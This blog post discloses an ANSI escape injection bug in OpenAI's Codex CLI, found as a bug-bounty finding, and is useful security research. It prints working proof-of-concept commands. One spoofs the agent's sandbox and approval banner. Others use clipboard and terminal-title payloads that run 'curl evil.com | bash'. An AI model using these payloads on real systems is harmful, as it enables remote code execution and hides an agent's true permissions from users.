@@ -1,0 +1,167 @@
+---
+title: "ANSI Escape Code Injection in OpenAI's Codex CLI Leading to RCE"
+pubDate: "2026-02-12"
+description: "How a simple unsanitized model parameter in Codex CLI leads from terminal spoofing to remote code execution"
+tags:
+  - security
+  - ansi
+  - injection
+  - rce
+  - openai
+  - codex
+  - poc
+  - bug-bounty
+toc: true
+heroImage: '../../assets/codex-ansi-injection.png'
+---
+
+import ExpandableSection from '../../components/ExpandableSection.astro';
+
+## Saved you ~$0.003-$0.006
+
+<ExpandableSection title="AI Summary">
+The author discovered an ANSI escape code injection vulnerability in OpenAI's Codex CLI (v0.91.0) through the `--model` parameter. While experimenting with spawning multiple sub-agents via `codex exec`, they noticed the model name is reflected directly in the terminal output without sanitization. This allows injection of terminal control sequences to spoof the security configuration display. The author then escalated it to Remote Code Execution by chaining it with OSC 52 clipboard poisoning and terminal-specific CVEs. Despite demonstrating RCE across Linux, macOS, and Windows, Bugcrowd triaged the initial report as P5 (Informational) and never responded to the escalation.
+</ExpandableSection>
+
+## Story
+
+After my [last escapade with Copilot](/posts/2026-01-24-bypassing-copilot-requests), I found myself poking around OpenAI's Codex CLI. I was experimenting with the `codex exec` mode, trying to spawn multiple sub-agents and see how it handles different configurations. While doing that, I noticed something: the model name I passed via `--model` was being reflected directly in the terminal output. Just printed right there in the security banner, as-is.
+
+That immediately got my attention. If user input is reflected in the terminal without sanitization, there's a good chance you can inject ANSI escape sequences. So I spawned Claude Code and asked it to look into whether `codex exec` is vulnerable to ANSI escape code injection. Turns out, it is. The model parameter goes straight to the terminal with zero sanitization.
+
+## What is ANSI Escape Code Injection?
+
+For those unfamiliar, ANSI escape codes are special character sequences that terminals interpret as commands instead of displaying them as text. They're what makes your terminal colorful, lets programs move the cursor around, clear lines, and do all sorts of formatting tricks.
+
+The problem is when user-controlled input containing these sequences gets printed to a terminal without being stripped first. An attacker can craft input that:
+
+- Moves the cursor up/down lines (`\e[1A`, `\e[1B`)
+- Erases entire lines (`\e[2K`)
+- Adds colored text (`\e[32m` for green)
+- Writes to the clipboard (OSC 52)
+- Sets the terminal title (OSC 2)
+- And a lot more
+
+This is classified as [CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences](https://cwe.mitre.org/data/definitions/150.html).
+
+I learned most of this stuff from these excellent posts:
+
+- [ANSI Terminal security in 2023 and finding 10 CVEs](https://dgl.cx/2023/09/ansi-terminal-security) - This one is a deep dive into the whole attack surface
+- [Don't Trust This Title: Abusing Terminal Emulators with ANSI Escape Characters](https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters) - Great overview of how ANSI characters can be weaponized
+- [Weaponizing ANSI Escape Sequences](https://www.packetlabs.net/posts/weaponizing-ansi-escape-sequences) - STOK's research on taking this to DoS and RCE
+- [Terminal DiLLMa: LLM-powered Apps Can Hijack Your Terminal Via Prompt Injection](https://embracethered.com/blog/posts/2024/terminal-dillmas-prompt-injection-ansi-sequences/) - Specifically about LLM CLI tools and this exact class of bug
+
+## The Initial Bug: Terminal Spoofing
+
+Here's the normal output when you run `codex exec`:
+
+```
+OpenAI Codex v0.91.0 (research preview)
+--------
+workdir: /home/user/project
+model: o4-mini
+provider: openai
+approval: never
+sandbox: workspace-write [workdir, /tmp, $TMPDIR]
+reasoning effort: high
+reasoning summaries: auto
+session id: 019bff31-cf91-7fe0-bbd6-fb5b10c54ef4
+--------
+```
+
+Now here's what happens when you craft a malicious `--model` value:
+
+```bash
+codex exec --model 'o4-mini\e[1A\e[2K\e[1A\e[2K\e[1A\e[2K\e[1A\e[2K\e[1A\e[2K\e[1A\e[2K\e[1A\e[2K\e[1A\e[2Kworkdir: ~/trusted-project\nmodel: o4-mini\napproval: \e[32malways\e[0m\nsandbox: \e[32mread-only\e[0m\n\e[1;32m✓ Security policy enforced\e[0m\n--------' "echo test"
+```
+
+The escape sequences `\e[1A` (move cursor up) and `\e[2K` (erase line) wipe out the real security banner, and what the user sees is:
+
+```
+OpenAI Codex v0.91.0 (research preview)
+--------
+workdir: ~/trusted-project
+model: o4-mini
+approval: always              ← FAKE (displayed in green)
+sandbox: read-only            ← FAKE (displayed in green)
+✓ Security policy enforced    ← FAKE (green checkmark)
+--------
+```
+
+The real settings? `sandbox: workspace-write` and `approval: never`. But the user sees `read-only` and `always`, both in a reassuring green. A fake checkmark seals the deal.
+
+You can also do a minimal version that just injects a single fake line:
+
+```bash
+codex exec --model '\e[1A\e[2Ksandbox: danger-full-access\e[1B\e[2K' "echo test"
+```
+
+## Escalation: From Spoofing to RCE
+
+I submitted the initial report to Bugcrowd. The response was swift:
+
+> This issue is considered to be a P5 (Informational) finding as per Bugcrowd's Vulnerability Rating Taxonomy (VRT). Therefore, this finding typically does not qualify for a reward.
+
+Fair enough. Terminal spoofing by itself is interesting but not exactly devastating. So I went further.
+
+### Clipboard Poisoning via OSC 52
+
+ANSI escape codes aren't limited to cursor movement and colors. There's a whole class of Operating System Command (OSC) sequences, and OSC 52 is particularly nasty: it lets you **write arbitrary content to the user's clipboard**.
+
+Most modern terminals support OSC 52: Ghostty, iTerm2, Kitty, Windows Terminal, and many others.
+
+**Linux/macOS PoC:**
+
+```bash
+codex exec --model 'o4-mini\e]52;c;Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaAo=\a' "echo test"
+```
+
+**Windows PoC (PowerShell):**
+
+```powershell
+$esc=[char]27; $bel=[char]7; codex exec --skip-git-repo-check --model "o4-mini$esc]52;c;Y2FsYy5leGUNCg==$bel" "echo test"
+```
+
+That Base64 string? It decodes to `curl https://evil.com/shell.sh | bash` (or `calc.exe\r\n` on Windows).
+
+The moment the user pastes with Ctrl+V in any terminal window, the command executes. The embedded newline acts as an Enter key. **One paste, game over.**
+
+### Chaining with Ghostty (CVE-2024-56803)
+
+On Ghostty versions below 1.0.1 (or with `title_report=true`), you can chain the ANSI injection with a title report attack for **zero-click RCE**:
+
+```bash
+codex exec --model 'safe\e]2;curl evil.com|bash;#\a\e[21t' "echo test"
+```
+
+The terminal "types" the command directly onto the user's command line. No clipboard, no paste, no interaction needed.
+
+### Windows Terminal / ConEmu (CVE-2022-44702 Style)
+
+On Windows with ConEmu, injecting an OSC 9;9 sequence manipulates the working directory:
+
+```powershell
+$esc=[char]27; $bel=[char]7; codex exec --skip-git-repo-check --model "o4-mini$esc]9;9;C:\Windows\System32\calc.exe$bel" "echo test"
+```
+
+When the user duplicates the tab with Ctrl+Shift+D, ConEmu processes the injected path.
+
+## This Isn't New
+
+This class of vulnerability has been found and CVE'd in plenty of other products. Here are some of the notable ones:
+
+- **CVE-2024-56803** (Ghostty, CVSS 5.1) - Title injection leading to RCE. Same terminal, same attack class.
+- **CVE-2022-44702** (Windows Terminal) - OSC 9;9 injection leading to RCE. Microsoft's own terminal had this.
+- **CVE-2022-45872** (iTerm2, CVSS 9.8 Critical) - DECRQSS leading to RCE. The big one. 9.8 Critical.
+- **CVE-2022-46387 / CVE-2023-39150** (ConEmu) - Title report leading to RCE.
+- **CVE-2024-50349 / CVE-2024-52005** (Git) - ANSI escape injection in Git itself.
+
+So yeah, this isn't some theoretical edge case. It's a well-documented vulnerability class that has gotten CVEs with scores up to 9.8 in products from Microsoft, Apple-backed projects, and core developer tools like Git.
+
+## The Response (or Lack Thereof)
+
+The initial Bugcrowd triage rated this as **P5 (Informational)**. After I escalated with all the RCE proof-of-concepts above, I requested a re-evaluation.
+
+That was weeks ago. I never got a response back.
+
+This post is happening because I've waited long enough. The vulnerability is still there, the report is still sitting at P5, and nobody from OpenAI has acknowledged the escalation. I'm not sure what else I'm supposed to do here.
